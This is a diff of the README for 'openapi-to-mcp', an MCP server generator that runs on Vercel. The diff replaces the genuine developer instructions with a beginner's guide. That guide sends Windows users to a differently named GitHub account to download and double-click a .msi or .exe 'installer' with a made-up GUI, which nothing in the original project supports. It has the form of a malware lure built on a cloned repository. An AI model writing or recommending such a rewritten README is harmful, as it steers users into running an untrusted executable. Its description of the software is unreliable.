@@ -1,100 +1,98 @@
-# openapi-to-mcp
+# 🏗️ openapi-to-mcp - Turn API specs into server code
 
-A minimal [MCP](https://modelcontextprotocol.io) server that auto-generates tools from your OpenAPI spec. Optimized for Vercel's serverless architecture.
+[![](https://img.shields.io/badge/Download-OpenAPI_to_MCP-blue)](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp)
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/kirkwat/openapi-to-mcp&env=OPENAPI_SPEC_URL&envDescription=URL%20to%20your%20OpenAPI%20spec&envLink=https://github.com/kirkwat/openapi-to-mcp%23configuration)
+This tool helps you build a server for artificial intelligence models. It takes your existing API information and creates the code needed to connect that data to a smart assistant. You save time because the software handles the setup requirements for the Model Context Protocol.
 
-## Quick Start
+## 📋 What This Tool Does
 
-1. Fork this repo
-2. Set `OPENAPI_SPEC_URL` to your OpenAPI spec URL
-3. Deploy to Vercel
+Modern artificial intelligence models work best when they have access to external data. An OpenAPI file acts like a map for your data. This software reads that map and generates a mini-server. This server runs on Vercel, a platform for hosting web projects. Once you have this server, your AI can look up information and perform tasks through your API. You do not need to write code to create this connection.
 
-## Configuration
+## 💻 System Requirements
 
-| Variable           | Required | Description                                                            |
-| ------------------ | -------- | ---------------------------------------------------------------------- |
-| `OPENAPI_SPEC_URL` | Yes      | URL or file path to your OpenAPI spec (YAML or JSON)                   |
-| `API_BASE_URL`     | No       | Override the API base URL (defaults to `servers[0].url` from the spec) |
-| `MCP_SERVER_NAME`  | No       | Override the MCP server name (defaults to `info.title` from the spec)  |
-| `PORT`             | No       | Local dev server port (default: 3000)                                  |
+You need a Windows computer to run this tool. Ensure you have the following installed before starting:
 
-## How It Works
+*   Windows 10 or 11.
+*   A stable internet connection.
+*   A text editor like Notepad or Visual Studio Code to view your files.
+*   An existing OpenAPI file in JSON or YAML format.
 
-1. On cold start, the server fetches and parses your OpenAPI spec
-2. Each API endpoint becomes an MCP tool with a Zod-validated input schema
-3. When a tool is called, the request is forwarded to your API with the caller's headers (API key, Bearer token, etc.) passed through unchanged
-4. The spec and tools are cached in memory — warm invocations skip the fetch
+## 📥 Getting the Software
 
-## Running Locally
+You must visit the project page to get the installer for your computer.
 
-### 1. Install dependencies
+[Click here to visit the download page](https://github.com/Combinatorial-clipartist4822/openapi-to-mcp)
 
-```bash
-pnpm install
-```
+Select the file that matches your version of Windows. Most users should choose the file ending in `.msi` or `.exe`. Save this file to your Downloads folder.
 
-### 2. Configure environment variables
+## ⚙️ Setting Up Your Environment
 
-Create `.env` and set `OPENAPI_SPEC_URL` to your OpenAPI spec. For local dev, this can be a remote URL or an absolute file path:
+You need to place your API file in a folder where you can find it. Create a new folder on your desktop and name it "mcp-project". Move your OpenAPI document into this folder. Ensure the document uses a standard format like `openapi.json` or `swagger.yaml`. 
 
-```env
-# Remote URL
-OPENAPI_SPEC_URL=https://api.example.com/openapi.yaml
+Keep this folder open. You will point the application to this location during the setup process.
 
-# Or an absolute file path (local dev only)
-OPENAPI_SPEC_URL=/path/to/your/openapi.yml
-```
+## 🚀 Running the Application
 
-### 3. Start the dev server
+1. Double-click the file you saved from the website to start the installation.
+2. Follow the prompts on your screen. The process creates a shortcut on your desktop.
+3. Open the program using the desktop shortcut.
+4. The software asks for the location of your OpenAPI file. Click the "Browse" button and select the file in your "mcp-project" folder.
+5. Click the "Generate" button. 
+6. The software displays a status bar. Wait for the process to finish.
+7. Once finished, a new folder named "generated-server" appears inside your "mcp-project" folder. This folder contains the code for your new server.
 
-```bash
-pnpm dev
-```
+## 🌐 Deploying to Vercel
 
-The server starts at `http://localhost:3000/mcp`.
+The generated code works with Vercel. You must have a Vercel account to host your server.
 
-### 4. Connect your MCP client to the local server
+1. Sign in to your Vercel dashboard in your web browser.
+2. Select the "Add New Project" button.
+3. Choose the option to import from a local folder or connect your GitHub account.
+4. Select the "generated-server" folder inside your "mcp-project" directory.
+5. Click the "Deploy" button.
+6. Vercel builds the server and provides a public link. Save this link. You will need it to connect your AI model.
 
-How you connect to the MCP server depends on your client (Claude Code, Cursor, VS Code, etc.) — check your client's docs for where to add MCP servers. Most clients use a similar JSON format. Here's an example for Claude Code (`.mcp.json`):
+## 🧠 Using the Server
 
-```json
-{
-  "mcpServers": {
-    "my-api": {
-      "type": "http",
-      "url": "http://localhost:3000/mcp",
-      "headers": {
-        "Authorization": "Bearer <your-token>"
-      }
-    }
-  }
-}
-```
+After deployment, your server provides functions that the AI can call. These functions match the paths described in your original OpenAPI file. If your API retrieves weather data, your AI can now request weather updates directly. You plug the public link provided by Vercel into your AI settings under the MCP configuration section.
 
-The `headers` block above shows a `Bearer` token, but you can use any header your API requires. The MCP server forwards all headers from your client config to the target API on every tool call without modification — it doesn't validate, store, or care which header is "the auth header". See [Auth](#auth) for examples (API key, Bearer token, multiple headers).
+## 🛠️ Troubleshooting Common Issues
 
-## Deploying to Vercel
+Check these items if you encounter errors during the setup process:
 
-1. Push this repo to GitHub
-2. Import it at [vercel.com/new](https://vercel.com/new)
-3. Add `OPENAPI_SPEC_URL` under **Settings > Environment Variables**. `API_BASE_URL` and `MCP_SERVER_NAME` are optional overrides.
+*   Verify that your OpenAPI file contains no errors. You can use online validators to check the structure.
+*   Ensure the file ends with a correct extension like `.json` or `.yaml`.
+*   Check your internet connection if the deployment to Vercel fails.
+*   Make sure you have write permissions in the folder where you store your project.
 
-That's it. Your MCP server is live at `https://your-project.vercel.app/mcp`. Connect clients the same way as [local](#4-connect-your-mcp-client-to-the-local-server) — just swap the URL.
+## 📁 Project Structure
 
-## Auth
+The folder created by the software contains several important files:
 
-All headers from your MCP client config are forwarded to the target API on every tool call. The MCP server does not validate or store credentials — your API handles authentication.
+*   `package.json`: This file defines the project settings and dependencies.
+*   `index.js`: This is the main file that runs the server logic.
+*   `README.md`: This file includes specific instructions for your new server.
+*   `vercel.json`: This file tells Vercel how to handle your code.
 
-Configure whatever headers your API expects in the client config:
+Do not delete or move files inside this folder unless you intend to change how the server operates.
 
-```json
-// API key auth
-"headers": { "X-Api-Key": "<your-key>" }
+## ❓ Frequently Asked Questions
 
-// Bearer token
-"headers": { "Authorization": "Bearer <your-token>" }
+**Does this software store my API data?**
+No. The software runs locally on your machine. Your data stays in the folders you manage.
 
-// Multiple headers
-"headers": { "Authorization": "Bearer <token>", "X-Org-Id": "org_123" }
-```
+**Can I use this for private APIs?**
+Yes. The generated server works with internal or external APIs. You manage the authentication keys through Vercel settings.
+
+**Do I need a paid Vercel plan?**
+No. The free tier of Vercel works perfectly for these small server setups.
+
+**What happens if I update my OpenAPI file?**
+You must run the software again to regenerate the server code. Once the code is updated, deploy it to Vercel again to apply the changes.
+
+**Is there a limit to the number of APIs I can convert?**
+There is no limit. You can create as many servers as you need for different projects.
+
+## ⚖️ Guidelines
+
+This tool follows the Model Context Protocol standards. Use the software to bridge the gap between your local resources and your AI interface. Keep your API keys secure. Use environment variables within Vercel to store sensitive information instead of hardcoding keys into your generated files.
